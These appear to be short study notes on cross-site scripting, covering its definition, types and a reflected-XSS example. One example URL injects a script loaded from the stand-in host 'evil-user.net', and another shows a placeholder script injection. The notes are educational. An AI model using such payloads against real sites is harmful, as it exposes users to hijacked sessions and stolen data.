=> What is cross-site scripting (XSS)?
XSS is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other.

=> How does XSS work?
XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code execute inside a victim's browser, the attacker can compromise their interaction
with the application. 

Example: https://insecure-website.com/comment?message=<script src=https://evil-user.net/badscript.js></script>

=> XSS Proof of concept
alert()
print()

=> Types of XSS attacks?

1: Reflected XSS
2: Stored XSS
3: DOM-based XSS

-> Reflected XSS: is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an
unsafe way.

--------------------####------------------------------------
https://insecure-website.com/status?message=All+is+well.
<p>status: all is well.</p> 

The applicationi doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:

https://insecure-website.com/status?message=<script>/*+bad+stuff+here...+*/</script>
<p>status: <script>/* bad stuff here--*/</script></p>
